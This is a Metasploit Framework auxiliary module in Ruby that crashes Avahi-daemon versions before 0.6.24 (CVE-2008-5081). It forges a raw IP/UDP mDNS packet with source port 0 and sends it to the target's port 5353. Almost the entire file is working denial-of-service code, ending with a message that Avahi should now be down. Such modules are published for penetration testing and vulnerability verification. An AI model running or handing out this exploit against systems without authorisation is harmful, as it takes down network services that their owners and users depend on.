##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'scruby'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ip
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'        => 'Avahi < 0.6.24 Source Port 0 DoS',
			'Description' => %q{
				Avahi-daemon versions prior to 0.6.24 can be DoS'd
				with an mDNS packet with a source port of 0
			},
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision$',
			'References'  => [ [ 'CVE', '2008-5081' ] ],
			'DisclosureDate' => 'Nov 14 2008')

		register_options([
			OptInt.new('RPORT', [true, 'The destination port', 5353])
		])
	end

	def run
		print_status("Sending to #{rhost}")

		connect_ip

		pkt = (
			Scruby::IP.new(
				:src    => "0.0.0.0",
				:dst    => "#{rhost}",
				:proto  => 17,
				:flags  => 2,
				:len    => 28,
				:ttl    => 128,
				:id     => 0xbeef,
				:chksum => 0
			) / Scruby::UDP.new(
				:sport  => 0,
				:dport  => datastore['RPORT'],
				:chksum => 0,
				:len    => 8
			)
		).to_net

		ip_write(pkt)

		disconnect_ip

		print_status("Avahi should be down now")
	end
end

